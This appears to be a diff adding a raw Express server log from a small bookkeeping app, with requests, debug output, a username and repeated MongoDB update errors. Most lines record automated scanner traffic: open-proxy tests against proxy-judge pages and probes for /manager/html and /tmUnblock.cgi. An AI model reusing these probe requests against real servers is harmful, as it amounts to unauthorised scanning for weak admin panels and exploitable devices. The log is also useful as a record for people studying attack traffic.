+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3022240953016302 [0m- [0m- ms - -[0m
+[0mGET http://www.example.com/ [32m200 [0m10.922 ms - 2732[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8768124091140867 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_140821586442152021101696 [32m200 [0m6.315 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_307299339617839382330752 [32m200 [0m1.397 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_6804659821616721456960 [32m200 [0m1.344 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_96608496825951805389544 [32m200 [0m1.297 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_1102216562521399924241200 [32m200 [0m1.485 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m1.407 ms - 2732[0m
+[0mGET / [32m200 [0m14.862 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4490177719616303 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4367660641250199 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.google.com/reader/about/ [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3512287488161011 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://115.239.210.27/ [32m200 [0m4.950 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1690177287477504 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m20.062 ms - 4892[0m
+[0mGET /monthHistory? [32m200 [0m20.133 ms - 137[0m
+[0mGET /accountDetail? [32m200 [0m33.952 ms - 278[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m5.171 ms - 4976[0m
+userName lilieming
+[{"userName":"lilieming","label":"超市","modifyTime":1463669403055,"count":25,"_id":"5717935b1efc4003029eddc1"}] result is 
+[0mPUT /moneyDetail [32m200 [0m8.647 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m4.832 ms - 4016[0m
+[0mGET /accountDetail? [32m200 [0m2.822 ms - 277[0m
+[0mGET http://www.sogou.com/?rands=_940052970411929503465840 [32m200 [0m1.765 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1791950952021427561257696 [32m200 [0m1.421 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_17871137571215217203177312 [32m200 [0m1.342 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_2449613456381499616474600 [32m200 [0m1.385 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_573370325623201252376956 [32m200 [0m1.405 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1348914348396611 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://testp1.piwo.pila.pl/testproxy.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+Not Found
+Not Found
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_1838433488029411911394232 [32m200 [0m6.819 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_26649137898821531182020992 [32m200 [0m1.389 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1404751929976683081632 [32m200 [0m1.444 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_5517132984619407961765344 [32m200 [0m1.375 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_61269517501756872451920 [32m200 [0m1.504 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2562560757869676 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7888440311376953 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_246065987218818643109200 [32m200 [0m7.511 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_4291101321613526761260960 [32m200 [0m2.016 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_643829786414243884419636 [32m200 [0m1.353 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_1108143095012635251722112 [32m200 [0m1.412 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_5693433544016677906024672 [32m200 [0m1.413 ms - 2732[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0199003337144336 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+task begin
+user colour.hu  has no data
+bakcup  data length is: undefined
+[0mGET / [32m200 [0m1.827 ms - 2732[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1013117260268869 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET /tmUnblock.cgi [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m3.335 ms - 2732[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m1.452 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1755080653603457 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_1388810532004180354920320 [32m200 [0m1.407 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_2864524454235680225960 [32m200 [0m1.442 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_7360110061039841922889684 [32m200 [0m1.500 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_889221465013878662504324 [32m200 [0m7.416 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_122586261908665713678476 [32m200 [0m1.433 ms - 2732[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2299864269660272 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m1.780 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mHEAD / [32m200 [0m5.685 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8581184334973840 [0m- [0m- ms - -[0m
+[0mGET http://115.239.210.27/ [32m200 [0m1.421 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m2.793 ms - 2732[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m1.399 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3518101461846246 [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m1.370 ms - 2732[0m
+[0mGET / [32m200 [0m1.443 ms - 2732[0m
+[0mGET http://www.sogou.com/?rands=_1224012714801198058414403332 [32m200 [0m1.390 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1757666880155252023296 [32m200 [0m1.392 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_18235619483603601124060 [32m200 [0m4.934 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_57121677701470330437892 [32m200 [0m1.434 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_561017912017119353921288 [32m200 [0m1.442 ms - 2732[0m
+[0mGET http://www.sogou.com/?rands=_19192537642245910664640 [32m200 [0m1.408 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1185628620018706023454240 [32m200 [0m1.298 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1134027424619430581959936 [32m200 [0m1.330 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_137882329602049921972720 [32m200 [0m1.323 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_449065172135643755031500264 [32m200 [0m2.750 ms - 2732[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m2.204 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1343479619110257 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2663986957943162 [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m5.050 ms - 2732[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_765013623017893082562556 [32m200 [0m2.473 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_217983110526469654711080 [32m200 [0m1.329 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_21421305607962601107568 [32m200 [0m1.373 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_53623765005003883284640 [32m200 [0m1.298 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_153108970921030986327700 [32m200 [0m1.327 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9562701566844008 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET /accountDetail? [32m200 [0m25.042 ms - 277[0m
+[0mGET /monthHistory? [32m200 [0m20.866 ms - 137[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m20.805 ms - 4016[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3939016660377483 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1999228510738911 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m20.564 ms - 4016[0m
+[0mGET /monthHistory? [32m200 [0m3.556 ms - 137[0m
+[0mGET /accountDetail? [32m200 [0m3.616 ms - 277[0m
+[0mGET / [32m200 [0m4.835 ms - 2732[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m1.617 ms - 2732[0m
+[0mGET http://www.sogou.com/?rands=_643822694411027523626368 [32m200 [0m14.675 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1323030311423914562435072 [32m200 [0m1.318 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_408897250293317271024 [32m200 [0m1.434 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_2560109796420583902622096 [32m200 [0m1.420 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_612611421001830075482048 [32m200 [0m1.462 ms - 2732[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://testp1.piwo.pila.pl/testproxy.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3432235473636508 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m10.170 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2001580328225683 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_225125170403138243228996 [32m200 [0m1.893 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_82804902015430803397756 [32m200 [0m1.391 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_643821276010108563286396 [32m200 [0m2.240 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_125167806226205543427448 [32m200 [0m1.447 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_1960879553014579883395784 [32m200 [0m1.442 ms - 2732[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m10.876 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET http://www.izhongsai.com/ [32m200 [0m1.427 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3678078468631223 [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m3.443 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1564609973354865 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7180411638231833 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_1248665169167762947648 [32m200 [0m3.238 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_110438713742934362087736 [32m200 [0m1.410 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_101046914481222200989920 [32m200 [0m1.477 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_878845760124201707156 [32m200 [0m1.421 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_1857810232647467871186308 [32m200 [0m1.341 ms - 2732[0m
+Not Found
+[0mGET //index.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2813378893574861 [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m7.253 ms - 2732[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5739913281083862 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /script [0m- [0m- ms - -[0m
+Not Found
+[0mGET //script [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m4.498 ms - 2732[0m
+[0mGET http://123.125.114.238/ [32m200 [0m1.629 ms - 2732[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m22.729 ms - 4016[0m
+[0mGET /monthHistory? [32m200 [0m3.751 ms - 137[0m
+[0mGET /accountDetail? [32m200 [0m3.709 ms - 277[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1681103339399014 [0m- [0m- ms - -[0m
+task begin
+bakcup  data length is: undefined
+user colour.hu  has no data
+userName lilieming
+[{"userName":"lilieming","label":"早餐","modifyTime":1463669336971,"count":12,"_id":"571793131efc4003029eddbf"}] result is 
+[0mPUT /moneyDetail [32m200 [0m9.079 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+userName lilieming
+[] result is 
+[0mPUT /moneyDetail [32m200 [0m4.869 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+userName lilieming
+[{"userName":"lilieming","label":"晚餐","modifyTime":1463746235180,"count":3,"_id":"572211391efc4003029edde5"}] result is 
+[0mPUT /moneyDetail [32m200 [0m25.952 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m4.975 ms - 3835[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_655270325623201252453632 [32m200 [0m2.919 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_125165430418597482615684 [32m200 [0m1.354 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_2314208985102312442821040 [32m200 [0m1.476 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_1515680062413444201039416 [32m200 [0m1.354 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_61307415924546847440910370628 [32m200 [0m2.541 ms - 2732[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4697187147740475 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3098040563012160 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m7.667 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5497944007640451 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_289445428923432453544020 [32m200 [0m4.089 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1838433488031194451491504 [32m200 [0m1.457 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_2245651456029989444651856 [32m200 [0m1.425 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_889235775022326543972376 [32m200 [0m1.442 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_1357321178433188402762820 [32m200 [0m13.618 ms - 2732[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5391341456114870 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m15.159 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3853091171105601 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9248978436372128 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6813180484709909 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4751287121856236 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m10.156 ms - 2732[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_3222524454235680215200 [32m200 [0m9.565 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_63805077245533291396332 [32m200 [0m1.493 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1388814218205259156150400 [32m200 [0m1.483 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_52086866603108302517760 [32m200 [0m1.336 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_79689456482532348604928 [32m200 [0m1.386 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6614371989158696 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://testp4.pospr.waw.pl/testproxy.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m7.081 ms - 2732[0m
+Not Found
